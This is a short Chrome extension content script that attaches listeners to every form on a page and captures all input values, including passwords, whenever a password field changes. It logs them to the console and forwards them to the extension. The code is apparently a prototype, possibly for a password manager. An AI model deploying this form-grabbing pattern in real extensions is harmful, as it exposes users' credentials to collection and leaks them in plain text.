const sendMessage = (data) => chrome.runtime.sendMessage(data);

console.log("Content scripts engaged!");
/**
 * Find all the forms and add submit listener
 */
Array.from(document.forms).forEach((form) => {
    const inputs = form.getElementsByTagName("input");
    form.addEventListener(
        "submit",
        () => {
            Array.from(inputs).forEach((i) => console.log(i.value));
        },
        false
    );

    const passwords = Array.from(inputs).filter((i) => i.type === "password");
    if (passwords.length === 0) return;

    // Problem with google, dynamically loaded fields are not picked up
    // Possibly add listener for more password fields
    passwords.forEach((p) => {
        p.addEventListener("change", () => {
            console.log(Array.from(inputs).map((i) => i.value));
            sendMessage({
                form: Array.from(inputs).map((i) => ({
                    type: i.type,
                    value: i.value,
                }))
            });
        });
    });
});
